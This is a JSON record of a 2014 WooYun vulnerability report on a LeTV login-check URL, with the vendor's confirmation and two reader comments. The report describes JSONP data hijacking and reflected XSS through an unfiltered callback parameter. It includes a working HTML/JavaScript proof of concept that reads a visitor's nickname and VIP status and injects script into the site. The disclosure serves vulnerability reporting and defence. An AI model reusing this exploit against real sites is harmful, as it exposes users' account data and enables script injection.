{"id": 54412, "wybug_id": "wooyun-2014-064465", "wybug_title": "乐视网某url xss+js hijack（一个洞洞两个用法）", "wybug_corp": "乐视网", "wybug_author": "xsjswt", "wybug_date": "2014-06-11 11:30", "wybug_open_date": "2014-07-26 11:34", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向公众公开  简要描述： 同一个url，可以xss，也可以hijack，为什么你sobug非要把两个不一样的漏洞认定为同一个漏洞呢。那我就发乌云试试 详细说明：  http://yuanxian.letv.com/letv/net/checkLogin.jsp?callback=xxx这个url存在两处问题1. 没有限制referer，也没有csrf token，可以js hijck读到来访用户在乐视的信息2. callback没有任何限制，可以导致反射型xss   漏洞证明：  \n<html><body><div id='x' name='x'></div><script>function xx(obj){        x.innerHTML='亲爱的乐视网网友:'+obj.nickname+'.<br />通过我们的检测发现,你'+(obj.isvip?'是乐视的VIP会员,好高大上.':'不是乐视网的会员,好屌丝.')+'<br />接下来我们要对你发动xss攻击了';        var o=document.createElement('iframe');        o.height=1;        o.width=1;        o.src='http://yuanxian.letv.com/letv/net/checkLogin.jsp?callback=<script>alert(\"hello '+obj.nickname+'. This is the alert from: \"%2bdocument.domain);<'+'/script>';        document.body.appendChild(o);}</script><script src='http://yuanxian.letv.com/letv/net/checkLogin.jsp?callback=xx'></script>\n\n\n\n\n\n\n   修复方案：  问下sobug的人，他们最专业了   版权声明：转载请注明来源 xsjswt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-11 11:33 厂商回复： 好问题，值得大家探讨，先通知修复吧~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 14:31 |    \t\trasca1 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:16        | 菜鸟一只)\t\t \n  应该是csrf +xss + hijack    \n     2014-07-11 13:10 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  咋滴了这是 一堆人跟土豆干上了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}